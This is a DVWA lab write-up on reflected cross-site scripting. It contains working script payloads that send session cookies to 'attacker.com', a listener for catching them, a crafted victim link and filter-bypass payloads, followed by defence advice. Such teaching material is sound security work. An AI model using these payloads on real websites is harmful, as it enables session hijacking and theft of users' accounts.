# ⚡ XSS - Reflected

## What is Reflected XSS?

Reflected XSS occurs when malicious script is included in a URL parameter, reflected back in the HTTP response, and executed in the victim's browser. The attack is delivered via a crafted link — when the victim clicks it, the script runs in their session.

---

## DVWA Module

The DVWA Reflected XSS page takes a `name` parameter and displays it directly on the page:

```php
// Vulnerable code (Low level)
echo '<pre>Hello ' . $_GET['name'] . '</pre>';
```

Input `<script>alert(1)</script>` gets rendered as HTML and executes.

---

## Step-by-Step Exploitation

### Step 1 — Basic test

Enter in the input box:

```html
<script>alert('XSS')</script>
```

If an alert pops up — the page is vulnerable.

---

### Step 2 — Steal session cookie

```html
<script>
  document.location='http://attacker.com/steal?c='+document.cookie
</script>
```

Or using image tag (no redirect):

```html
<script>
  new Image().src='http://attacker.com/steal?c='+document.cookie;
</script>
```

On attacker's server, start a listener:

```bash
python3 -m http.server 8888
# Check logs for incoming cookie
```

---

### Step 3 — Craft malicious URL

The payload goes in the URL. Share this with a victim:

```
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
```

Or URL-encoded:

```
http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```

---

## Payloads

See [`payloads.txt`](./payloads.txt)

---

## Security Levels

| Level | Protection |
|-------|-----------|
| Low | No filtering — `<script>` works directly |
| Medium | Filters `<script>` tag — use `<img>`, `<svg>`, event handlers |
| High | Strict tag filtering — try event-based or template injection |
| Impossible | Uses `htmlspecialchars()` — all HTML encoded |

---

## Bypass Techniques (Medium/High)

```html
<!-- No <script> needed -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<a href="javascript:alert(1)">click</a>

<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- No quotes -->
<img src=x onerror=alert`1`>
```

---

## How to Defend

- Use `htmlspecialchars()` or equivalent to encode all output
- Implement a strict **Content Security Policy (CSP)** header
- Set `HttpOnly` flag on session cookies (prevents JS access)
- Validate and sanitize all user input server-side
- Use frameworks that auto-escape output (React, Django templates, etc.)
